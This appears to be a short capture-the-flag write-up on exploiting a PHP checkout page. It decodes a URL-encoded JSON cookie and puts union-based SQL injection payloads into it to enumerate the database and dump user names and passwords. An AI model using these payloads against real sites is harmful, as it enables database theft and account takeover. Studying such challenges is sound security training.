    Normally if you are being redirected to a checkout page there would be some sort of payment method that you need to use in order to buy the item(s) you want.

    If we take a closed look on the button we can see that it’s not doing any sort of post / get request.
    So there must be something else that we can abuse.
    Looking at the cookies we ecan see a strange “hash”

    By using CyberChef we can see that it’s just a string URL Encoded
    By decoding this we can see the content: {"YCS98E4A":"1"}

    Remember, this server uses PHP so we will try a SQL Injection in the cookie keeping the format we just decoded.
    By trying to find the number of rows we can see that we get a successful hit on the 3rd row.

    Payload:

    {"1' union select 1,2,3-- -":"1"}

    Now with that information in mind we can try to dump every piece of data we can in order to elevate our privilages.
    We will dump the database name first so we can enumerate it.

    {"1' union select 1,database(),3-- -":"1"}

    Now we will need to dump the table_name & table_schema:

    {"1' union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}

    Now let’s dump the user’s username & password:

    {"1' union select 1,username,2 from checkout.user-- -":"1"}
{"1' union select 1,password,2 from checkout.user-- -":"1"}
